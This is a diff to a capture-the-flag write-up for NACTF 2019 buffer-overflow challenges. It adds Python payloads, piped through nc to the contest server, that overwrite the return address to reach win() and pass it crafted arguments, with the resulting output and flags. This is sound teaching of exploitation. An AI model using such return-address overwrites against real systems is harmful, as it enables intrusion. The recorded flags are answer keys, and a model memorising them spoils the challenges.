@@ -354,7 +354,7 @@ flag: nactf{0v3rfl0w_th4at_buff3r_18ghKusB}
 #### Flag
 `nactf{0v3rfl0w_th4at_buff3r_18ghKusB}`
 
-
+***
 
 ## BufferOverflow #1 (200)
 
@@ -372,13 +372,16 @@ Can you redirect code execution and get the flag?
 - [bufover-1.c](Files/bufover-1.c)
 
 #### Solution
-Now we have to overwrite the **return address** of func **vuln()** to func **win()**. So after func **vuln()** finish, we will return to func **win()** and got flag.
-First, I use **radare2** tool to find address of func **win()**. That is **0x080491b2**
-Second, we need the offset of **return address**. `buf` in **vuln()** is at `ebp-0x18`. So, return address will be at offset `0x18 + 4` (4 bytes for Saved BP) from `buf`.
+Now we have to overwrite the **return address** of func **vuln()** into the address of func **win()**. So after func **vuln()** finish, it will return to func **win()** and we got flag.
+
+I use **radare2** to find the address of func **win()**. That is **0x080491b2**.
+
+Variable `buf` in **vuln()** is at `ebp-0x18`. So, return address will be at offset `0x18 + 4` (4 bytes for Saved BP) from `buf`.
+
 Finally, we got payload like this:
 
 ```bash
-python -c "print 'A'*0x18 + 'B'*4 + '\xb2\x91\x04\x08'" | nc  shell.2019.nactf.com 31462
+$ python -c "print 'A'*0x18 + 'B'*4 + '\xb2\x91\x04\x08'" | nc  shell.2019.nactf.com 31462
 Type something>You typed AAAAAAAAAAAAAAAAAAAAAAAABBBB�!
 You win!
 flag: nactf{pwn_31p_0n_r3t_iNylg281}
@@ -386,3 +389,47 @@ flag: nactf{pwn_31p_0n_r3t_iNylg281}
 
 #### Flag
 `nactf{pwn_31p_0n_r3t_iNylg281}`
+
+
+***
+
+## BufferOverflow #2 (200)
+
+#### Description
+> The close cousin of a website for "Question marked as duplicate" - part 3!
+Can you control the arguments to win() and get the flag?
+
+> Connect at shell.2019.nactf.com:31184
+
+#### Hint
+> How are arguments passed to a function?
+
+#### File
+- [bufover-1](Files/bufover-1)
+- [bufover-1.c](Files/bufover-1.c)
+
+#### Solution
+Again, we also need to overwrite the **return address** of func **vuln()** into the address of func **win()**.
+
+But the tricky is we have to pass 2 arguments to func **win()**. We do it like so:
+```bash
+$ python -c "print 'A'*0x18 + 'B'*4 + '\xc2\x91\x04\x08' + 'C'*4 + '\x55\xda\xb4\x14' + '\xbe\xb4\x0d\xf0'" | nc shell.2019.nactf.com 31184
+�!pe something>You typed AAAAAAAAAAAAAAAAAAAAAAAABBBCCCCUڴ��
+Close, but not quite.
+
+```
+You will see that it's not work. Because of this:
+```c
+void win(long long arg1, int arg2)
+```
+arg1 is of *long long* type. So we have to change the payload a litte.
+```bash
+$ python -c "print 'A'*0x18 + 'B'*4 + '\xc2\x91\x04\x08' + 'C'*4 + '\x55\xda\xb4\x14' + '\x00'*4 + '\xbe\xb4\x0d\xf0'" | nc shell.2019.nactf.com 31184
+Type something>You typed AAAAAAAAAAAAAAAAAAAAAAAABBBCCCCUڴ!
+You win!
+flag: nactf{PwN_th3_4rG5_T0o_Ky3v7Ddg}
+
+```
+
+#### Flag
+`nactf{PwN_th3_4rG5_T0o_Ky3v7Ddg}`
